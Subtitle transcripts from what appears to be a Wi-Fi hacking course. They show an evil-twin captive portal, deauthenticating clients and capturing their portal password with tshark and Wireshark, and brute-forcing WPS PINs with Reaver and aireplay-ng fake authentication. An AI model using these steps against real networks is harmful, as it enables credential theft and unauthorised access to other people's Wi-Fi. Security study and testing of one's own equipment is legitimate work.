And as you can see now, that's working.

78
00:05:07,950 --> 00:05:15,600
So let's go back, put Https and see if the Web page is going to work.

79
00:05:16,610 --> 00:05:17,570
Now perfect.

80
00:05:17,570 --> 00:05:20,360
As you can see, the Web page is working.

81
00:05:20,840 --> 00:05:23,780
Now you can see that it's saying your connection is not secure.

82
00:05:23,780 --> 00:05:26,820
But that's not because Https is not working.

83
00:05:26,840 --> 00:05:32,920
That's because we self-signed the certificate and we just generated it locally on our computer.

84
00:05:32,930 --> 00:05:38,750
But if you remember at the start of the video, when I tried to go to the Https version, literally

85
00:05:38,750 --> 00:05:39,650
nothing happened.

86
00:05:39,650 --> 00:05:41,860
I couldn't even access the web page.

87
00:05:41,870 --> 00:05:43,910
But now the web page is working.

88
00:05:43,910 --> 00:05:47,180
It's just telling us that the certificate is not trusted.

89
00:05:47,850 --> 00:05:50,370
Let's go to the target Windows machine.

90
00:05:50,400 --> 00:05:58,200
Connect to my network and try to go to Facebook or any of those websites and see what this is going

91
00:05:58,200 --> 00:06:02,130
to look like for the client, because it's actually going to look much better than this.

92
00:06:02,490 --> 00:06:04,830
So I'm here at the Windows machine.

93
00:06:05,400 --> 00:06:11,730
I'm going to go on my networks and as usual, connect to Royal Wi-Fi version two.

94
00:06:13,590 --> 00:06:19,320
And as you can see, automatically I get the login and I see the bar and we see how to achieve this

95
00:06:19,320 --> 00:06:19,770
before.

96
00:06:19,770 --> 00:06:22,260
So that's not what we're really interested in.

97
00:06:22,260 --> 00:06:27,270
What we want to see is we want to go to Facebook and see what happens.

98
00:06:29,310 --> 00:06:32,660
Now, as you can see, this looks amazing.

99
00:06:32,670 --> 00:06:35,670
You can see that it's just telling us log in to network.

100
00:06:35,670 --> 00:06:37,080
It's not showing any errors.

101
00:06:37,080 --> 00:06:41,340
It's not saying that secure connection couldn't be established.

102
00:06:41,340 --> 00:06:47,670
It's basically saying this website uses hsts and therefore you just can't browse it.

103
00:06:47,700 --> 00:06:48,950
Please log in.

104
00:06:48,960 --> 00:06:53,010
If we click on the login, we go to the login page where we can log in.

105
00:06:55,300 --> 00:06:56,980
So now anywhere we go.

106
00:06:56,980 --> 00:06:59,890
So let's go to a normal website like Bing.com.

107
00:07:00,010 --> 00:07:02,610
You'll see that we get the normal login page.

108
00:07:02,620 --> 00:07:08,290
If we go to websites that use Https like for example, Gmail.

109
00:07:09,750 --> 00:07:10,740
It'll just tell us.

110
00:07:10,740 --> 00:07:11,710
Please log in.

111
00:07:11,730 --> 00:07:13,830
We can see the bar in here.

112
00:07:13,830 --> 00:07:16,020
We can see everything is getting redirected.

113
00:07:16,020 --> 00:07:19,350
The login page is being displayed automatically for us.

114
00:07:19,350 --> 00:07:24,180
So we've made a really, really good fake network that behaves really well.

115
00:07:24,180 --> 00:07:27,060
It actually acts exactly like a captive portal.

116
00:07:27,750 --> 00:07:33,720
Not only that, but the way the login screen gets displayed automatically is very convincing and I think

117
00:07:33,720 --> 00:07:37,500
it will fool a lot of people, even if they have a WPA password.

118
00:07:37,500 --> 00:07:39,840
And we'll see that later on in the course.

119
00:07:40,640 --> 00:07:45,020
Now, in the next lecture, I'm going to show you how we're going to be able to capture the passwords

120
00:07:45,020 --> 00:07:48,070
entered when people log in to this Web page.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,960 --> 00:00:07,860
Okay, now that we have created our fake access point and it's working perfectly against Https.

2
00:00:07,890 --> 00:00:15,270
Hsts and all websites, it's automatically showing its login screen and the login screen looks exactly

3
00:00:15,270 --> 00:00:17,760
like the login screen that the people are used to.

4
00:00:17,790 --> 00:00:23,010
We are ready to move to the next step, which is the authenticating users.

5
00:00:23,040 --> 00:00:30,300
So you're going to go ahead use airplay and the authenticate all users or some users from the actual

6
00:00:30,300 --> 00:00:35,970
network so that they connect to your version two network and enter their password in there.

7
00:00:36,090 --> 00:00:41,490
Now, I'm not going to be covering that because I've already covered how to run a authentication attack

8
00:00:41,520 --> 00:00:44,760
against a single multiple and all clients before.

9
00:00:44,760 --> 00:00:50,460
So I'm going to skip over this and I'm going to assume that you already authenticated your clients and

10
00:00:50,460 --> 00:00:55,260
your client is now or clients are connecting to your fake access point.

11
00:00:55,380 --> 00:01:01,420
The final step is going to be sniffing the login and the password that they're going to be entering.

12
00:01:01,930 --> 00:01:08,020
Now, I've also covered sniffing before, but this is the end result of everything that we've done so

13
00:01:08,020 --> 00:01:08,350
far.

14
00:01:08,350 --> 00:01:13,750
So I kind of have to show it, and I'm also going to do it using a slightly different way, just to

15
00:01:13,750 --> 00:01:18,010
show you a handier way for this particular scenario.

16
00:01:18,670 --> 00:01:20,950
So I'm going to go to my Kali machine.

17
00:01:21,370 --> 00:01:28,060
So I already have my wireless access point running and it's called Royal WiFi version two, as you know.

18
00:01:28,210 --> 00:01:34,300
Now all I have to do is just capture the packets and I'm just going to use something a little bit different,

19
00:01:34,300 --> 00:01:38,050
like I said, because I think this is going to be more convenient.

20
00:01:38,200 --> 00:01:41,230
So we're going to use a tool called Tshark.

21
00:01:42,260 --> 00:01:46,940
And this is actually what Wireshark uses when sniffing for data.

22
00:01:47,270 --> 00:01:49,760
We're going to set the interface to LAN zero.

23
00:01:50,670 --> 00:01:55,380
And we're going to use Dash W to store the data in a file.

24
00:01:55,380 --> 00:02:00,810
And let's call this royal wi fi dot cap.

25
00:02:02,170 --> 00:02:04,150
So we're using a very simple command.

26
00:02:04,150 --> 00:02:05,490
We're doing tshark.

27
00:02:05,530 --> 00:02:09,160
We're giving it the interface that we want to sniff the data on.

28
00:02:09,160 --> 00:02:15,370
And I'm using line zero because line zero is the wireless adapter that we're using to broadcast the

29
00:02:15,370 --> 00:02:15,960
signal.

30
00:02:15,970 --> 00:02:20,560
So any request the target sends, they're actually going to send it to the router.

31
00:02:20,560 --> 00:02:26,320
And the router in this case is LAN zero because it's what's broadcasting our signal.

32
00:02:26,830 --> 00:02:33,880
We're storing everything using the W option into a file called Royal WiFi.

33
00:02:34,780 --> 00:02:36,130
I'm going to hit enter.

34
00:02:37,170 --> 00:02:40,650
And as you can see, this is not going to display anything for me.

35
00:02:40,650 --> 00:02:46,830
This is literally just going to capture packets, store them in a file called Royal WiFi Pcap.

36
00:02:46,980 --> 00:02:53,070
So that's why it's really handy because I can just let this run and then come back to it later on,

37
00:02:53,070 --> 00:02:55,920
open it in Wireshark and analyze it.

38
00:02:56,220 --> 00:02:58,680
So let's go to the Windows machine.

39
00:03:00,240 --> 00:03:02,790
And let's connect to royal Wi-Fi.

40
00:03:08,560 --> 00:03:14,620
And as you can see, as we seen before, when you try to log in, when you connect, you'll automatically

41
00:03:14,620 --> 00:03:15,970
get the login page.

42
00:03:16,210 --> 00:03:22,750
Now, we're assuming that you should have by now you should have run add authentication attack so that

43
00:03:22,750 --> 00:03:27,610
nobody can connect to the actual network and they can only connect to your fake AP.

44
00:03:28,480 --> 00:03:30,340
So they're going to go on English.

45
00:03:30,340 --> 00:03:35,800
This is not going to be suspicious at all to them because this is exactly the same page that they're

46
00:03:35,800 --> 00:03:37,750
used to enter their information on.

47
00:03:38,380 --> 00:03:41,350
So the user is going to put their username, which is Z.

48
00:03:42,440 --> 00:03:46,400
And I'm going to put the password, which is one, two, three, four, five, six.

49
00:03:48,620 --> 00:03:50,300
I'm going to click on login.

50
00:03:52,470 --> 00:03:58,050
And as you can see, it's automatically telling me could not get portal configuration.

51
00:03:58,050 --> 00:04:02,340
So the person is going to think that there is an error or something is going wrong.

52
00:04:02,730 --> 00:04:05,460
Now let's go back to the Kali machine.

53
00:04:06,120 --> 00:04:11,850
I'm going to stop this by doing Ctrl C and then I'm going to open Wireshark.

54
00:04:14,900 --> 00:04:19,730
And we'll analyze the file that contains the data that we just captured.

55
00:04:20,360 --> 00:04:22,820
So I'm going to go to file.

56
00:04:24,010 --> 00:04:24,790
Open.

57
00:04:26,070 --> 00:04:31,110
And the file that we just created is called Royal WiFi Recap.

58
00:04:31,950 --> 00:04:33,450
I'm going to click on Open.

59
00:04:36,210 --> 00:04:40,980
And as you can see, we have all the packets that we captured so far in here.

60
00:04:41,190 --> 00:04:48,060
Now, what we're looking for and what we're interested in is Http packets, because as you remember,

61
00:04:48,060 --> 00:04:54,780
we added a form in the HTML page and we set that form to use a post request.

62
00:04:54,960 --> 00:05:01,350
And that's why I said if we add that it's going to be very easy for us to analyze and find the username

63
00:05:01,350 --> 00:05:02,250
and password.

64
00:05:02,760 --> 00:05:05,940
So in the filter in here, I'm just going to type in Http.

65
00:05:07,170 --> 00:05:13,410
And that will show me only the Http packets that were sent over this network.

66
00:05:13,560 --> 00:05:18,390
And as you can see here, all these requests are get request.

67
00:05:18,840 --> 00:05:24,040
Now, again, we set the method in our form that we added manually to use post.

68
00:05:24,060 --> 00:05:27,840
So we're going to look for something that says post in here.

69
00:05:29,970 --> 00:05:30,510
Okay.

70
00:05:30,510 --> 00:05:33,000
And we have a post request in here.

71
00:05:33,630 --> 00:05:41,820
Now, if we click on the HTML form, you can see that we have a form item called username.

72
00:05:41,820 --> 00:05:44,190
And the value for that was Zayd.

73
00:05:44,430 --> 00:05:50,970
And then we have another form item and the value for that is one, two, three, four, five, six.

74
00:05:51,240 --> 00:05:58,470
So we managed to capture the username and the password right now and all we have to do is just go in

75
00:05:58,470 --> 00:06:02,220
and log in to that network using the username and the password.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 5: Gaining Access - WPA & WPA2 Cracking - Exploiting WPS


1
00:00:00,170 --> 00:00:00,680
All right.

2
00:00:00,710 --> 00:00:04,780
Now we're going to start talking about cracking WPA and Wpa2.

3
00:00:04,790 --> 00:00:11,750
And as you know by now, the easiest and the the most guaranteed method of gaining access to WPA and

4
00:00:11,990 --> 00:00:18,110
Wpa2 is to hack through it using river if WPA is enabled.

5
00:00:18,350 --> 00:00:24,350
Now, you also probably know that this will not work against all routers, especially new ones, so

6
00:00:24,350 --> 00:00:29,180
the router has to be configured to use PBC or push button authentication.

7
00:00:29,180 --> 00:00:33,140
And even with that it'll still fail in a lot of cases.

8
00:00:33,560 --> 00:00:38,720
So in this section I'm going to show you how to first of all get River to show you more information

9
00:00:38,720 --> 00:00:44,690
about what's happening in the background so you can debug and see where it's going wrong because a lot

10
00:00:44,690 --> 00:00:47,570
of people give up on routers too soon.

11
00:00:47,570 --> 00:00:53,360
So we're going to see how you can bypass some of the security features implemented by some routers.

12
00:00:53,360 --> 00:01:00,080
And I'm also going to show you how to unlock some routers if they lock after a number of failed attempts.

13
00:01:01,190 --> 00:01:08,060
I'm spending more time on River and WP because it is the only guaranteed method right now to gain access

14
00:01:08,060 --> 00:01:10,780
to WPA and Wpa2 networks.

15
00:01:10,790 --> 00:01:14,780
Even the new crack attack will not allow you to get the key.

16
00:01:14,870 --> 00:01:17,650
So with this method you won't need to use a word list.

17
00:01:17,660 --> 00:01:20,660
It's a brute force method which is guaranteed to work.

18
00:01:20,690 --> 00:01:24,110
It's just that it doesn't really work against all routers.

19
00:01:24,110 --> 00:01:29,150
So with the knowledge that you're going to get from this section, you should be able to execute it

20
00:01:29,150 --> 00:01:30,500
on more routers.

21
00:01:30,500 --> 00:01:33,980
But again, it's still not going to work against all routers.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:01,350 --> 00:00:09,210
Previously we seen how we can use River to crack the spin and from it get the WPA key.

2
00:00:09,240 --> 00:00:14,100
We've seen the basic usage against a router that's not very secure.

3
00:00:14,250 --> 00:00:20,430
Now, like I said, that router was given to me by the internet provider with these default settings.

4
00:00:20,430 --> 00:00:26,280
So most people will actually leave it at these settings and it'll be as easy as that to exploit all

5
00:00:26,280 --> 00:00:31,950
the networks that use these routers unless the user went and manually changed the settings.

6
00:00:33,150 --> 00:00:37,890
Now, in this lecture, I want to show you another example of a more secure router.

7
00:00:37,890 --> 00:00:44,070
So this is another router that I have in here and I want to run a repair against it and we'll see how

8
00:00:44,070 --> 00:00:47,040
we can crack its pin and get the password.

9
00:00:48,060 --> 00:00:53,730
So first of all, we're going to have to run watch to see all the WP enabled routers against me.

10
00:00:53,730 --> 00:00:55,190
So we're going to do wash.

11
00:00:56,650 --> 00:00:58,630
I mean, zero.

12
00:00:58,780 --> 00:01:02,000
So this is exactly the same command that we were running before.

13
00:01:02,020 --> 00:01:05,090
Mon zero is my wireless adapter in monitor mode.

14
00:01:05,110 --> 00:01:06,460
I'm going to hit Enter.

15
00:01:09,370 --> 00:01:14,080
And as you can see, I have all the WP enabled routers around me.

16
00:01:14,470 --> 00:01:21,790
Now, my target in this video is going to be this one, which is called Test Ap2 and it has this Mac

17
00:01:21,820 --> 00:01:22,540
address.

18
00:01:23,560 --> 00:01:30,580
So like we did before, I'm going to first copy this and I'm going to run the basic revert command that

19
00:01:30,580 --> 00:01:31,890
we used previously.

20
00:01:31,900 --> 00:01:33,730
So it's just going to be river.

21
00:01:35,210 --> 00:01:35,800
Sid.

22
00:01:37,410 --> 00:01:38,940
Then give it the channel.

23
00:01:39,680 --> 00:01:40,910
Which is 11.

24
00:01:41,880 --> 00:01:46,620
And then we'll give it my wireless adapter in monitor mode, which is non-zero.

25
00:01:47,160 --> 00:01:49,770
So a very basic command that we've seen before.

26
00:01:49,770 --> 00:01:50,970
We're just doing river.

27
00:01:51,000 --> 00:01:53,970
We're giving it the ID of the target network.

28
00:01:54,000 --> 00:01:58,410
Then we're giving it the channel of that network as well.

29
00:01:58,410 --> 00:02:02,200
And then we are giving it my wireless card in monitor mode.

30
00:02:02,220 --> 00:02:03,750
I'm going to hit Enter.

31
00:02:05,530 --> 00:02:11,050
Now, I've actually executed this command before, so it's asking me, do I want to continue from where

32
00:02:11,050 --> 00:02:12,200
I left in the last time?

33
00:02:12,220 --> 00:02:13,900
Do I want to restore my session?

34
00:02:13,900 --> 00:02:17,720
I'm going to say no because I want you to see what's going to happen.

35
00:02:17,740 --> 00:02:20,380
So we're assuming that we're starting from scratch.

36
00:02:23,430 --> 00:02:29,580
And as you can see, it keeps saying failed to associate with my Mac address.

37
00:02:29,760 --> 00:02:33,270
And this message will keep continuing to show in here.

38
00:02:33,270 --> 00:02:38,910
So it will basically just be stuck in here and we're just not going to get any results at all.

39
00:02:39,930 --> 00:02:42,840
So I'm going to first control C out of this.

40
00:02:44,820 --> 00:02:50,910
Now to fix this issue, we're going to manually associate with this access point.

41
00:02:50,940 --> 00:02:56,730
So I actually covered before in a full lecture how to run a fake authentication attack.

42
00:02:56,880 --> 00:03:00,450
This is exactly what they mean here by association.

43
00:03:00,450 --> 00:03:07,080
So what we're going to do, we're going to manually associate with the target using airplay NG, and

44
00:03:07,080 --> 00:03:12,270
then we'll run River again and tell it not to associate because we're going to do that manually.

45
00:03:12,270 --> 00:03:16,140
So we'll just tell River to do the rest of the things that you usually do.

46
00:03:16,140 --> 00:03:20,280
But don't associate this time because I'm going to do that manually.

47
00:03:21,290 --> 00:03:23,120
So I'm going to split the screen.

48
00:03:26,030 --> 00:03:30,480
And I'm going to run airplay here to associate with my target.

49
00:03:30,500 --> 00:03:32,240
So I'm going to do airplay NG.

50
00:03:33,080 --> 00:03:35,690
I'm going to do dash dash fake auth.

51
00:03:36,550 --> 00:03:40,180
To associate with the target to do a fake authentication attack.

52
00:03:40,750 --> 00:03:42,690
Then I'm going to have to give the delay.

53
00:03:42,700 --> 00:03:48,160
And previously we used to give this as zero because we don't do this for a long period of time.

54
00:03:48,160 --> 00:03:53,170
So we usually don't need to stay associated with the target for a long period of time.

55
00:03:53,860 --> 00:04:02,130
In this example, we want to be associated with the target for as long as the time when River is working.

56
00:04:02,140 --> 00:04:04,420
So I'm going to set this to 100.

57
00:04:04,990 --> 00:04:12,490
And what this is going to do, it will basically set a delay of 100 seconds between the association

58
00:04:12,490 --> 00:04:18,640
attempts, between the time when they send the fake authentication packets.

59
00:04:19,720 --> 00:04:25,120
Next, I'm going to have to give the Mac address of the target access point.

60
00:04:25,120 --> 00:04:28,690
So we're going to do dash A and give the Mac address.

61
00:04:29,470 --> 00:04:36,070
Then I'm going to have to give the Mac address of my own wireless card and we'll do that using the dash

62
00:04:36,070 --> 00:04:37,240
H option.

63
00:04:37,720 --> 00:04:42,430
And to get my Mac address, I'm going to have to split the screen again.

64
00:04:45,030 --> 00:04:47,550
And do ifconfig one zero.

65
00:04:47,580 --> 00:04:53,190
So we're doing ifconfig followed by the name of your wireless adapter in monitor mode.

66
00:04:53,910 --> 00:04:55,380
I'm going to hit enter.

67
00:04:55,710 --> 00:05:00,240
And under the on spec this is your Mac address.

68
00:05:00,240 --> 00:05:04,020
So it's the first 12 digits of the on spec field.

69
00:05:04,800 --> 00:05:08,250
So in here to type it, this is going to be zero zero.

70
00:05:08,850 --> 00:05:10,110
C zero.

71
00:05:10,260 --> 00:05:10,890
C.

72
00:05:10,890 --> 00:05:12,630
AA2.

73
00:05:12,630 --> 00:05:14,520
A298.

74
00:05:14,760 --> 00:05:20,640
Finally, we'll type the name of my wireless adapter in monitor mode, which is one zero.

75
00:05:21,460 --> 00:05:23,170
So I'm going to close this here.

76
00:05:25,920 --> 00:05:28,380
And I'm just going to go over the command one more time.

77
00:05:28,380 --> 00:05:35,370
So the whole idea of doing this command is so that I can manually associate with my target because as

78
00:05:35,370 --> 00:05:38,640
you can see here, River is failing to associate it.

79
00:05:38,640 --> 00:05:44,360
Can't associate with my target, therefore it can't go and start brute forcing the pin.

80
00:05:44,370 --> 00:05:46,740
So we're going to do this manually here.

81
00:05:46,740 --> 00:05:48,720
We're doing it using aireplay ng.

82
00:05:49,230 --> 00:05:54,990
We're telling Aireplay ng that I want you to do a fake authentication attack to associate with my target.

83
00:05:55,800 --> 00:06:00,510
I want you to use a delay of 100 seconds between the association attempts.

84
00:06:00,660 --> 00:06:08,220
I want the Mac address of the target access point to be this one and my own Mac address is this one

85
00:06:08,490 --> 00:06:12,390
and this is my wireless adapter in monitor mode.

86
00:06:13,880 --> 00:06:15,380
Now, this is all good.

87
00:06:15,410 --> 00:06:17,830
Now we need to go back to river.

88
00:06:17,840 --> 00:06:22,760
And whenever we're going to run river, we're going to use the exact same command that we run previously.

89
00:06:22,790 --> 00:06:26,840
The only thing is I'm going to do Dash Capital A.

90
00:06:27,440 --> 00:06:29,390
Now, I didn't discover this myself.

91
00:06:29,390 --> 00:06:35,330
If you just do revert dash, dash help, you'll see all the options that you can use with river, including

92
00:06:35,330 --> 00:06:41,120
the dash A and you'll see a description that you can use this to tell River not to associate with the

93
00:06:41,120 --> 00:06:41,810
target.

94
00:06:42,930 --> 00:06:45,480
So we run river like that now.

95
00:06:47,250 --> 00:06:51,180
And this is asking me if I want to restore my session, I'm going to say no.

96
00:06:51,540 --> 00:06:58,050
And then as I as soon as I hit enter, I'm going to go down here and start the fake authentication process.

97
00:06:58,050 --> 00:07:03,450
So I'm going to hit enter here, go down here, hit, enter, and let's see what's going to happen.

98
00:07:09,260 --> 00:07:10,070
And perfect.

99
00:07:10,100 --> 00:07:13,130
Now we managed to bypass this issue.

100
00:07:13,160 --> 00:07:18,170
We managed to bypass the association issue because, as you can see, it's saying that it's associated

101
00:07:18,170 --> 00:07:21,980
and it looks like it's trying to get trying to guess it.

102
00:07:21,980 --> 00:07:24,380
But for some reason, we're not moving ahead.

103
00:07:24,380 --> 00:07:27,710
We're still stuck at 0.00%.

104
00:07:28,510 --> 00:07:32,560
So for now, we actually bypass the association problem.

105
00:07:32,680 --> 00:07:38,800
And in the next lecture I'll show you how to debug and tackle the other problem that we're facing.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,950 --> 00:00:01,430
Okay.

2
00:00:01,430 --> 00:00:08,570
Now, in the previous lecture we seen how we can fix the association problem if River could not associate

3
00:00:08,570 --> 00:00:13,610
with the target and was just giving you the failed to associate problem in here.

4
00:00:13,610 --> 00:00:18,200
And we seen how we can fix that by manually associating with the target.

5
00:00:19,410 --> 00:00:21,750
Now, in many cases, that's it.

6
00:00:21,750 --> 00:00:23,640
That'll be the end of the issue.

7
00:00:23,820 --> 00:00:27,840
So that was a completely separate issue that we solved.

8
00:00:27,870 --> 00:00:34,230
The problem is after we solved that issue, we run river, we bypass that issue.

9
00:00:34,230 --> 00:00:39,450
But we were kind of stuck at 0.00% and River wasn't moving.

10
00:00:39,450 --> 00:00:41,640
It wasn't giving us any information.

11
00:00:41,640 --> 00:00:43,560
So we really didn't know what to do.

12
00:00:43,560 --> 00:00:46,410
So we're kind of stuck on what's the next step?

13
00:00:47,480 --> 00:00:53,210
So what I want to show you in this lecture is a way of debugging and knowing what's happening in the

14
00:00:53,210 --> 00:00:53,990
background.

15
00:00:53,990 --> 00:00:57,440
And we'll see how to bypass the issue that's actually happening.

16
00:00:58,250 --> 00:01:04,900
So first of all, before I start trying solutions, I want to know what's happening in the background.

17
00:01:04,910 --> 00:01:10,520
And to do that, we're going to run the exact same command using the exact same sequence that we were

18
00:01:10,520 --> 00:01:11,560
doing before.

19
00:01:11,570 --> 00:01:17,840
But I'm going to add one more argument to the command, and that is dash v, v, v.

20
00:01:18,230 --> 00:01:25,490
And what this does, it basically tells River to produce verbose output, which means that it'll give

21
00:01:25,490 --> 00:01:30,230
us as much information as possible about what's happening in the background.

22
00:01:31,270 --> 00:01:36,610
Now, we usually don't use this option because you'll see the screen will get filled with messages and

23
00:01:36,610 --> 00:01:38,540
it will be hard to track what's happening.

24
00:01:38,560 --> 00:01:43,960
But if you're getting stuck, this is the only way for you to debug and know what's happening.

25
00:01:44,410 --> 00:01:46,780
So I'm going to hit enter for this.

26
00:01:47,830 --> 00:01:50,190
And it's asking me if I want to continue.

27
00:01:50,200 --> 00:01:55,330
I'm going to say no because I like to always start from scratch, especially if I didn't make any progress.

28
00:01:55,720 --> 00:02:01,510
And before I do that, I'll get my command ready here and I'm going to hit Enter here.

29
00:02:01,540 --> 00:02:02,560
Go back here, Hit.

30
00:02:02,560 --> 00:02:03,970
Enter to associate.

31
00:02:04,840 --> 00:02:06,190
And let's see what's happening.

32
00:02:09,020 --> 00:02:14,090
So I'm going to let this run for a little bit and then I'm going to control C out of it, obviously,

33
00:02:14,090 --> 00:02:16,410
because we know this is actually not going to work.

34
00:02:16,430 --> 00:02:21,860
And once we once we stop, we're going to analyze the output and see what's happening.

35
00:02:21,860 --> 00:02:24,560
But as you can see it, producing a lot of output.

36
00:02:24,560 --> 00:02:30,320
And that's why we usually don't use the Dash V, because if things are going well, we actually don't

37
00:02:30,320 --> 00:02:31,910
need to see these messages.

38
00:02:33,580 --> 00:02:33,880
Okay.

39
00:02:33,880 --> 00:02:38,380
Now, I think this is enough for us to know what's happening, so I'm just going to control C here.

40
00:02:39,490 --> 00:02:41,440
And I'm going to control C in here.

41
00:02:42,520 --> 00:02:46,060
I'm going to bring this down a little bit so we can focus on the top.

42
00:02:47,430 --> 00:02:49,470
So we can see the start here.

43
00:02:49,470 --> 00:02:52,440
We can see that it associated here with no problems.

44
00:02:52,440 --> 00:02:53,610
So that's all good.

45
00:02:55,480 --> 00:02:58,900
And we can see this is the first pin that it's guessing.

46
00:02:58,900 --> 00:03:02,110
So it's 00055673.

47
00:03:02,890 --> 00:03:05,560
Now it's sending the requests.

48
00:03:05,560 --> 00:03:09,670
And as you can see, it's getting a timeout error.

49
00:03:10,420 --> 00:03:12,970
Now let's keep going and see what's happening.

50
00:03:16,150 --> 00:03:24,250
Now we can see after sending the NAC packets, we're getting a message saying transaction failed and

51
00:03:24,250 --> 00:03:28,900
it's going to try the last pin so it doesn't know whether this pin is valid or not.

52
00:03:28,900 --> 00:03:32,200
So it's just going to try the exact same pin again.

53
00:03:33,340 --> 00:03:36,820
Looking back at what's happening, the same thing happens.

54
00:03:36,850 --> 00:03:39,190
It sends a snag.

55
00:03:39,190 --> 00:03:41,500
And then again the same thing happens.

56
00:03:41,500 --> 00:03:43,090
The transaction fails.

57
00:03:43,140 --> 00:03:50,710
Goes back to trying the same exact pin go down and you see the same thing happening and it's still trying

58
00:03:50,710 --> 00:03:51,820
the same pin.

59
00:03:52,750 --> 00:03:57,250
Now, looking at this, let's look at the help.

60
00:03:57,250 --> 00:03:58,510
So let's do River.

61
00:04:00,860 --> 00:04:01,370
Dash.

62
00:04:01,370 --> 00:04:02,180
Dash, Help.

63
00:04:04,820 --> 00:04:08,360
This will show us all the options that we can use with River.

64
00:04:09,200 --> 00:04:15,710
And if you look in here, you'll see we have an option of capital N or dash Dash Non-x.

65
00:04:15,830 --> 00:04:22,520
And what this does, it tells River not to send Nak messages when out of order packets are received.

66
00:04:23,800 --> 00:04:29,140
Now looking at the output here at the way that river keeps receiving these packets.

67
00:04:29,140 --> 00:04:34,390
And then it's repeating the same thing because it's sending the WSC, NAC.

68
00:04:34,420 --> 00:04:40,930
We can try to tell River not to send this NAC and just keep trying and see if this actually fixes the

69
00:04:40,930 --> 00:04:48,640
problem because it looks like it's the WSC NAC packets that's causing River to get stuck in this loop.

70
00:04:49,960 --> 00:04:53,050
So I'm going to run the exact same command again.

71
00:04:53,050 --> 00:04:58,150
And this time we're adding one more argument and we're saying no next.

72
00:05:00,830 --> 00:05:03,050
Okay, so I'm going to hit enter again.

73
00:05:03,050 --> 00:05:07,280
I'm going to say no to start from scratch and I'm going to prepare my command here.

74
00:05:07,490 --> 00:05:12,050
So enter, enter and let's see what happens.

75
00:05:16,430 --> 00:05:21,110
Now River is trying this pin, which is 0005678.

76
00:05:21,440 --> 00:05:23,600
Let's see if the next pin is going to be different.

77
00:05:23,630 --> 00:05:27,440
Now, I already know this pin is different than the first one because I noticed the first one.

78
00:05:27,440 --> 00:05:28,700
But let's see.

79
00:05:28,730 --> 00:05:29,450
And boom.

80
00:05:29,450 --> 00:05:29,720
Yeah.

81
00:05:29,750 --> 00:05:31,130
Next pin is different.

82
00:05:31,160 --> 00:05:35,180
Now it's zero one, two, three, five, six, seven, eight.

83
00:05:36,550 --> 00:05:38,170
And again, a new pin.

84
00:05:38,380 --> 00:05:41,270
So we're doing 11156 70.

85
00:05:42,780 --> 00:05:43,560
And perfect.

86
00:05:43,560 --> 00:05:48,360
So, so far River has tried for pins and it's actually making progress.

87
00:05:48,360 --> 00:05:50,180
So we're not stuck at where we were.

88
00:05:50,190 --> 00:05:54,720
We managed to bypass that the 0X2 and 0X3 issues.

89
00:05:54,720 --> 00:05:58,860
And now we can just let river work and brute force the password.

90
00:05:58,860 --> 00:05:59,580
For me.

91
00:06:00,090 --> 00:06:05,550
Now it detected API rate limiting, which is another issue that I'm going to cover later.

92
00:06:05,550 --> 00:06:12,180
But for now we managed to bypass the 0X2 and 0X3 issue.

93
00:06:12,570 --> 00:06:20,790
So the take home lesson from this lecture is you can do the minus V to debug and see exactly what's

94
00:06:20,790 --> 00:06:22,200
happening in the background.

95
00:06:22,200 --> 00:06:28,200
You can do dash dash, help to see the options and we've seen how we can use the known X to bypass the

96
00:06:28,200 --> 00:06:31,320
0X2 and 0X3 issues.

97
00:06:31,920 --> 00:06:37,410
Now I want to note that each of these issues now with the router I have right now is a very stubborn

98
00:06:37,410 --> 00:06:37,860
one.

99
00:06:37,860 --> 00:06:42,280
So probably you might not face all of these issues that I'm covering now.

100
00:06:42,280 --> 00:06:47,860
In a router, for example, you might face the issue that I covered previously about the association,

101
00:06:47,860 --> 00:06:50,380
but everything will run smoothly after that.

102
00:06:50,380 --> 00:06:53,590
Or maybe you could associate with no problem.

103
00:06:53,590 --> 00:06:59,350
You won't need to manually associate, but you'll get stuck after that and you'll have to run vive see

104
00:06:59,350 --> 00:07:02,530
what's happening, and then maybe use non X like I showed you.

105
00:07:02,920 --> 00:07:09,250
Or maybe you won't face any of these issues and you might jump straight to the rate limiting issue that

106
00:07:09,250 --> 00:07:12,070
we're getting right now and that I said I'm going to cover later.

107
00:07:12,340 --> 00:07:18,250
So each of these issues, I'm putting them in a different lecture because you might only face one of

108
00:07:18,250 --> 00:07:18,760
them.

109
00:07:18,910 --> 00:07:24,730
And obviously there might be the case where you face 2 or 3 of them like I'm showing you right now.

110
00:07:24,730 --> 00:07:28,180
But the idea is you might actually only face one of these.

111
00:07:28,210 --> 00:07:33,700
And I want you to understand how to bypass each one of these issues individually instead of just giving

112
00:07:33,700 --> 00:07:38,830
you a long river command that will bypass or that will try to bypass most issues.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,350 --> 00:00:06,470
Now, the attack that we've seen in the previous video worked perfectly because the pin was really simple.

2
00:00:06,470 --> 00:00:12,140
It was set to one, two, three, four, five, 670, and it actually came from the factory like this.

3
00:00:12,140 --> 00:00:14,450
So most people will not be modifying that.

4
00:00:14,450 --> 00:00:20,090
And if your target is using the same router that I got from my Internet provider, then you'll be able

5
00:00:20,090 --> 00:00:22,490
to crack their password very, very easily.

6
00:00:22,880 --> 00:00:25,070
Right now I just want to show you an example.

7
00:00:25,070 --> 00:00:29,540
I actually modified the router settings and I set the pin to be something more random.

8
00:00:29,540 --> 00:00:34,430
Again, it still has to be eight digits and it still has to be made out of digits only.

9
00:00:34,430 --> 00:00:38,390
So you'll still be able to cover all possibilities and crack it.

10
00:00:38,390 --> 00:00:41,810
And I just want to show you that this still works.

11
00:00:41,810 --> 00:00:46,640
If the pin was more complicated than just one, two, three, four, five, six, seven.

12
00:00:46,730 --> 00:00:48,920
So I'm just going to run wash again.

13
00:00:53,460 --> 00:00:59,460
And we can see that I have my target here, the test AP And I'm just going to run River against it exactly

14
00:00:59,460 --> 00:01:01,230
like I did in the previous lecture.

15
00:01:03,160 --> 00:01:08,170
Give it the ID and the channel and my wireless interface.

16
00:01:08,680 --> 00:01:09,850
I'm going to hit Enter.

17
00:01:11,690 --> 00:01:14,870
And the river actually supports pause and resume.

18
